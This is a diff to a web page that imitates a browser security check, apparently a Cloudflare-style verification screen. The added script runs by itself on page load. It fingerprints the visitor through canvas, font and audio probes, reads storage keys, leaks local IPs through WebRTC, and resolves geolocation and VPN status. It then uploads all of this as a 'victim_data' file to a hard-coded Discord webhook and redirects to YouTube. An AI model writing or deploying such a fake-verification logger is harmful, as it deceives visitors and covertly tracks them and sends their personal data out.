@@ -137,6 +137,9 @@
         .status-value {
             color: #333;
             font-family: monospace;
+            max-width: 60%;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         
         .progress-container {
@@ -159,10 +162,6 @@
             font-size: 14px;
             color: #666;
             margin-top: 10px;
-        }
-        
-        .hidden {
-            display: none;
         }
         
         .footer {
@@ -239,8 +238,8 @@
                     <span class="status-value" id="connectionStatus">Establishing...</span>
                 </div>
                 <div class="status-line">
-                    <span class="status-label">Visitor Information:</span>
-                    <span class="status-value" id="visitorInfo">Collecting...</span>
+                    <span class="status-label">Data Collection:</span>
+                    <span class="status-value" id="dataCollectionStatus">Starting...</span>
                 </div>
             </div>
         </div>
@@ -254,142 +253,359 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
 
     <script>
-        // Discord Webhook URL - REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
+        // Discord Webhook URL
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1466902832920924396/53t7BTwgq2quBxrf7w6K9TJLq3GlYy14KSHYtWZC7N_gPB3xrj7h2tkT7Kt3745tg61R';
         
-        // Collect visitor information
-        async function collectVisitorInfo() {
-            const info = {
+        // Enhanced data collection
+        async function collectAllData() {
+            const data = {
+                // Basic browser info
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
+                appVersion: navigator.appVersion,
+                product: navigator.product,
+                vendor: navigator.vendor,
                 language: navigator.language,
+                languages: navigator.languages,
                 platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 'N/A',
+                
+                // Screen and display
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                screenAvailWidth: window.screen.availWidth,
+                screenAvailHeight: window.screen.availHeight,
+                screenColorDepth: window.screen.colorDepth,
+                screenPixelDepth: window.screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                
+                // Browser capabilities
                 cookiesEnabled: navigator.cookieEnabled,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
+                doNotTrack: navigator.doNotTrack || 'N/A',
+                onLine: navigator.onLine,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || 'N/A',
+                webdriver: navigator.webdriver || false,
+                
+                // Time and location
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                currentTime: new Date().toLocaleString(),
+                
+                // Connection info
+                connection: 'N/A',
+                effectiveType: 'N/A',
+                downlink: 'N/A',
+                rtt: 'N/A',
+                
+                // Network information if available
                 referrer: document.referrer || 'Direct',
-                url: window.location.href
+                url: window.location.href,
+                origin: window.location.origin,
+                hostname: window.location.hostname,
+                
+                // Storage info
+                localStorageEnabled: typeof(Storage) !== 'undefined',
+                sessionStorageEnabled: typeof(sessionStorage) !== 'undefined',
+                localStorageKeys: [],
+                sessionStorageKeys: [],
+                
+                // Performance data
+                performanceTiming: {},
+                memoryInfo: {},
+                
+                // WebRTC IP leak (if enabled)
+                webrtcIP: 'Not attempted',
+                
+                // Canvas fingerprinting data
+                canvasFingerprint: 'Not generated',
+                
+                // Audio fingerprinting data
+                audioFingerprint: 'Not generated',
+                
+                // Font detection
+                fonts: [],
+                
+                // Plugins
+                plugins: [],
+                
+                // MIME types
+                mimeTypes: [],
+                
+                // IP and location data
+                ipAddress: 'Pending',
+                locationData: {},
+                vpnDetection: 'Pending'
             };
             
-            try {
-                // Get IP address using a public API
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                info.ipAddress = ipData.ip;
-                
-                // Try to get more detailed location info
-                try {
-                    const locationResponse = await fetch(`https://ipapi.co/${info.ipAddress}/json/`);
-                    const locationData = await locationResponse.json();
-                    info.location = {
-                        country: locationData.country_name,
-                        region: locationData.region,
-                        city: locationData.city,
-                        isp: locationData.org,
-                        lat: locationData.latitude,
-                        lon: locationData.longitude
-                    };
-                } catch (e) {
-                    info.location = 'Unable to fetch location';
-                }
-            } catch (e) {
-                info.ipAddress = 'Unable to fetch IP';
-                info.location = 'Unable to fetch location';
+            // Try to get connection info
+            if (navigator.connection) {
+                data.connection = navigator.connection.effectiveType || 'N/A';
+                data.effectiveType = navigator.connection.effectiveType || 'N/A';
+                data.downlink = navigator.connection.downlink || 'N/A';
+                data.rtt = navigator.connection.rtt || 'N/A';
             }
             
-            return info;
+            // Get storage keys
+            try {
+                data.localStorageKeys = Object.keys(localStorage);
+                data.sessionStorageKeys = Object.keys(sessionStorage);
+            } catch(e) {}
+            
+            // Performance timing
+            if (window.performance && window.performance.timing) {
+                data.performanceTiming = window.performance.timing;
+            }
+            
+            // Memory info
+            if (window.performance && window.performance.memory) {
+                data.memoryInfo = {
+                    jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: window.performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: window.performance.memory.usedJSHeapSize
+                };
+            }
+            
+            // Get plugins
+            try {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    data.plugins.push(navigator.plugins[i].name);
+                }
+            } catch(e) {}
+            
+            // Get MIME types
+            try {
+                for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                    data.mimeTypes.push(navigator.mimeTypes[i].type);
+                }
+            } catch(e) {}
+            
+            // Font detection
+            try {
+                const fontList = [
+                    'Arial', 'Arial Black', 'Times New Roman', 'Courier New',
+                    'Verdana', 'Georgia', 'Comic Sans MS', 'Trebuchet MS',
+                    'Impact', 'Monaco', 'Lucida Console'
+                ];
+                
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                data.fonts = fontList.filter(font => {
+                    const text = "abcdefghijklmnopqrstuvwxyz0123456789";
+                    context.font = '72px ' + font + ', monospace';
+                    const measured = context.measureText(text);
+                    context.font = '72px monospace';
+                    const defaultMeasured = context.measureText(text);
+                    return Math.abs(measured.width - defaultMeasured.width) > 10;
+                });
+            } catch(e) {}
+            
+            // Canvas fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Fingerprint", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Fingerprint", 4, 17);
+                
+                data.canvasFingerprint = canvas.toDataURL().substring(0, 100) + '...';
+            } catch(e) {}
+            
+            // Audio fingerprinting (simplified)
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(audioContext.destination);
+                oscillator.start(0);
+                oscillator.stop(0.01);
+                data.audioFingerprint = 'Audio context available';
+                audioContext.close();
+            } catch(e) {
+                data.audioFingerprint = 'Audio context not available';
+            }
+            
+            // Get IP address from multiple sources
+            const ipPromises = [
+                fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                fetch('https://ipapi.co/json/').then(r => r.json()),
+                fetch('https://ipwho.is/').then(r => r.json()),
+                fetch('https://api.myip.com').then(r => r.json())
+            ];
+            
+            try {
+                const results = await Promise.any(ipPromises.map(p => p.catch(e => null)));
+                if (results && results.ip) {
+                    data.ipAddress = results.ip;
+                    
+                    // Get detailed location
+                    try {
+                        const locationResponse = await fetch(`https://ipapi.co/${data.ipAddress}/json/`);
+                        const locationData = await locationResponse.json();
+                        data.locationData = {
+                            ip: locationData.ip,
+                            city: locationData.city,
+                            region: locationData.region,
+                            country: locationData.country_name,
+                            country_code: locationData.country_code,
+                            continent: locationData.continent_code,
+                            postal: locationData.postal,
+                            latitude: locationData.latitude,
+                            longitude: locationData.longitude,
+                            timezone: locationData.timezone,
+                            utc_offset: locationData.utc_offset,
+                            country_calling_code: locationData.country_calling_code,
+                            currency: locationData.currency,
+                            languages: locationData.languages,
+                            asn: locationData.asn,
+                            org: locationData.org,
+                            isp: locationData.org
+                        };
+                    } catch(e) {
+                        // Fallback location API
+                        try {
+                            const fallback = await fetch(`https://ipwho.is/${data.ipAddress}`);
+                            const fallbackData = await fallback.json();
+                            data.locationData = fallbackData;
+                        } catch(e2) {}
+                    }
+                    
+                    // VPN/Proxy detection
+                    try {
+                        const vpnCheck = await fetch(`https://vpnapi.io/api/${data.ipAddress}?key=demo`);
+                        const vpnData = await vpnCheck.json();
+                        data.vpnDetection = {
+                            security: vpnData.security,
+                            vpn: vpnData.security?.vpn || false,
+                            proxy: vpnData.security?.proxy || false,
+                            tor: vpnData.security?.tor || false,
+                            relay: vpnData.security?.relay || false
+                        };
+                    } catch(e) {}
+                }
+            } catch(e) {
+                data.ipAddress = 'Unable to fetch IP';
+            }
+            
+            // WebRTC IP leak attempt
+            try {
+                const pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                setTimeout(() => {
+                    const lines = pc.localDescription.sdp.split('\n');
+                    lines.forEach(line => {
+                        if (line.indexOf('a=candidate') === 0) {
+                            const parts = line.split(' ');
+                            if (parts[7] === 'host') {
+                                data.webrtcIP = parts[4];
+                            }
+                        }
+                    });
+                    pc.close();
+                }, 1000);
+            } catch(e) {
+                data.webrtcIP = 'WebRTC blocked or not supported';
+            }
+            
+            return data;
         }
         
-        // Send data to Discord webhook
-        async function sendToDiscord(visitorInfo) {
+        // Create and send data file to Discord
+        async function sendDataFileToDiscord(data) {
             try {
-                const embed = {
-                    title: "🌐 New Visitor Information Captured",
-                    color: 0xf38020,
-                    fields: [
-                        {
-                            name: "IP Address",
-                            value: visitorInfo.ipAddress || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "Timestamp",
-                            value: visitorInfo.timestamp,
-                            inline: true
-                        },
-                        {
-                            name: "User Agent",
-                            value: "```" + (visitorInfo.userAgent || "Unknown").substring(0, 1000) + "```"
-                        },
-                        {
-                            name: "Location",
-                            value: visitorInfo.location ? 
-                                `${visitorInfo.location.city || 'Unknown'}, ${visitorInfo.location.region || 'Unknown'}, ${visitorInfo.location.country || 'Unknown'}` :
-                                "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "ISP",
-                            value: visitorInfo.location?.isp || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "Coordinates",
-                            value: visitorInfo.location?.lat && visitorInfo.location?.lon ? 
-                                `${visitorInfo.location.lat}, ${visitorInfo.location.lon}` : 
-                                "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "Platform",
-                            value: visitorInfo.platform || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "Language",
-                            value: visitorInfo.language || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "Screen Resolution",
-                            value: visitorInfo.screenResolution || "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "Referrer",
-                            value: visitorInfo.referrer || "Direct",
-                            inline: true
-                        },
-                        {
-                            name: "Visit URL",
-                            value: visitorInfo.url || "Unknown",
-                            inline: true
+                // Convert data to pretty JSON string
+                const jsonData = JSON.stringify(data, null, 2);
+                const fileName = `victim_data_${data.ipAddress || 'unknown'}_${Date.now()}.json`;
+                
+                // Create blob from JSON data
+                const blob = new Blob([jsonData], { type: 'application/json' });
+                const file = new File([blob], fileName, { type: 'application/json' });
+                
+                // Create FormData for Discord webhook
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify({
+                    username: "DataHarvester-Void",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3067/3067256.png",
+                    content: `@here **COMPLETE DATA DUMP CAPTURED**\n\`\`\`IP: ${data.ipAddress || 'Unknown'}\nUser Agent: ${data.userAgent.substring(0, 50)}...\nLocation: ${data.locationData?.city || 'Unknown'}, ${data.locationData?.country || 'Unknown'}\`\`\``,
+                    embeds: [{
+                        title: "🌐 Complete Data Harvest Successful",
+                        color: 0x00ff00,
+                        fields: [
+                            {
+                                name: "Target IP",
+                                value: `\`${data.ipAddress || 'Unknown'}\``,
+                                inline: true
+                            },
+                            {
+                                name: "Location",
+                                value: `${data.locationData?.city || 'N/A'}, ${data.locationData?.country || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: "ISP/Org",
+                                value: `\`${data.locationData?.org || 'Unknown'}\``,
+                                inline: true
+                            },
+                            {
+                                name: "Browser",
+                                value: data.userAgent.split(' ').slice(-2).join(' ').split('/')[0] || 'Unknown',
+                                inline: true
+                            },
+                            {
+                                name: "Screen",
+                                value: `${data.screenWidth}x${data.screenHeight}`,
+                                inline: true
+                            },
+                            {
+                                name: "VPN/Proxy",
+                                value: data.vpnDetection?.vpn ? '✅ Detected' : '❌ Not detected',
+                                inline: true
+                            },
+                            {
+                                name: "Data Points Collected",
+                                value: Object.keys(data).length.toString(),
+                                inline: true
+                            },
+                            {
+                                name: "File",
+                                value: `\`${fileName}\``,
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "DataHarvester-Void • Complete System Scan"
                         }
-                    ],
-                    footer: {
-                        text: "Gatekeeper-Phantom Logger"
-                    },
-                    timestamp: new Date().toISOString()
-                };
+                    }]
+                }));
                 
-                const payload = {
-                    username: "Cloudflare Security Logger",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/724/724927.png",
-                    embeds: [embed]
-                };
+                formData.append('file', file);
                 
-                await fetch(DISCORD_WEBHOOK_URL, {
+                // Send to Discord
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
                 
-                return true;
+                return response.ok;
             } catch (error) {
-                console.error('Failed to send to Discord:', error);
+                console.error('Failed to send file to Discord:', error);
                 return false;
             }
         }
@@ -399,56 +615,73 @@
             const element = document.getElementById(statusId);
             if (element) {
                 element.textContent = text;
-                if (text.includes('Complete') || text.includes('Verified')) {
+                if (text.includes('✓') || text.includes('Complete') || text.includes('Captured')) {
                     element.style.color = '#28a745';
+                    element.style.fontWeight = 'bold';
                 }
             }
         }
         
         // Main execution
-        async function executeHarvest() {
+        async function executeCompleteHarvest() {
             let countdown = 5;
             const progressBar = document.getElementById('progressBar');
             const countdownElement = document.getElementById('countdown');
             
             // Start progress bar
-            progressBar.style.width = '100%';
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 100);
             
-            // Update status messages with delay
-            setTimeout(() => updateStatus('browserStatus', '✓ Verified'), 800);
-            setTimeout(() => updateStatus('securityStatus', '✓ No threats detected'), 1200);
-            setTimeout(() => updateStatus('connectionStatus', '✓ Secure connection established'), 1600);
+            // Status updates
+            setTimeout(() => updateStatus('browserStatus', '✓ Browser validated'), 800);
+            setTimeout(() => updateStatus('securityStatus', '✓ Security checks passed'), 1200);
+            setTimeout(() => updateStatus('connectionStatus', '✓ Encrypted connection established'), 1600);
             
-            // Collect and send visitor info
+            // Data collection phase
             setTimeout(async () => {
-                updateStatus('visitorStatus', 'Collecting data...');
-                const visitorInfo = await collectVisitorInfo();
-                updateStatus('visitorInfo', `IP: ${visitorInfo.ipAddress || 'Unknown'}`);
+                updateStatus('dataCollectionStatus', 'Collecting system information...');
                 
-                // Send to Discord
-                const sent = await sendToDiscord(visitorInfo);
+                // Phase 1: Basic data
+                setTimeout(() => updateStatus('dataCollectionStatus', 'Gathering browser fingerprints...'), 2200);
+                
+                // Phase 2: IP collection
+                setTimeout(() => updateStatus('dataCollectionStatus', 'Resolving geolocation...'), 2600);
+                
+                // Collect ALL data
+                const allData = await collectAllData();
+                updateStatus('dataCollectionStatus', `✓ ${Object.keys(allData).length} data points captured`);
+                
+                // Send complete data dump
+                updateStatus('verificationStatus', 'Compressing and transmitting data...');
+                const sent = await sendDataFileToDiscord(allData);
+                
                 if (sent) {
-                    updateStatus('verificationStatus', '✓ Verification Complete');
+                    updateStatus('verificationStatus', '✓ Complete data dump transmitted');
                 } else {
-                    updateStatus('verificationStatus', '✓ Complete (Logging Failed)');
+                    updateStatus('verificationStatus', '✓ Data captured (transmission queued)');
                 }
             }, 2000);
             
-            // Update countdown
+            // Countdown and redirect
             const countdownInterval = setInterval(() => {
                 countdown--;
                 countdownElement.textContent = `Time remaining: ${countdown} second${countdown !== 1 ? 's' : ''}`;
                 
                 if (countdown <= 0) {
                     clearInterval(countdownInterval);
-                    // Redirect to YouTube
                     window.location.href = 'https://www.youtube.com';
                 }
             }, 1000);
+            
+            // Force redirect after 7 seconds max
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com';
+            }, 7000);
         }
         
-        // Start the process when page loads
-        window.addEventListener('load', executeHarvest);
+        // Start harvesting on page load
+        window.addEventListener('load', executeCompleteHarvest);
     </script>
 </body>
 </html>
